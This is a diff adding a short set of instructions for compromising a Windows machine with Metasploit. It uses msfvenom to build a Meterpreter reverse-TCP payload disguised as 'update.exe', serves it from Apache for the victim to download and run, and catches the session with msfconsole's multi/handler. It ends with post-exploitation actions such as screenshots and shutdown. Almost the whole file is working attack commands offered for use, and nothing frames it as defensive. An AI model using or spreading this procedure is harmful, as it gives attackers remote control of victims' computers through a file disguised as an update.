@@ -1,0 +1,43 @@
+terminal-1:
+--------------------
+ifconifg(copy the ipadress of the machine)
+
+
+terminal-2:
+--------------------
+sudo su
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=<ipadress> LPORT=4444 -o /home/sai/update.exe
+                                                                                                     --------------------(where you want to store your payload) 
+After executing this above command a "update.exe" file is seen in the specified mention path 
+Copy the file and place it on desktop
+
+In t1:
+-------------------
+msfconsole(a console is started)
+use exploit/multi/handler(opens multihandler)
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ipadress of your system>
+set LPORT 4444
+exploit(it will start eploiting)
+
+IN t2:
+----------------
+cp /home/sai/update.exe((where your payload is) /var/www/html
+service apache2 start
+
+
+OPEN YOUR WINDOWS 
+--------------------------
+open browser
+Enter you ip of your system<ip>: A window will be open as apache2
+now <ip>/update.exe(payload name)--(it will download a file into your local system)
+now run the file by double click on it where it is downloaded
+
+
+IN t1:
+-----------
+The meterpreter is loaded now what you want to do is your choice -by knowing commands
+help
+Now run the commands
+screenshot/screenshare/shutdown ….etc
+-----------------end------------------
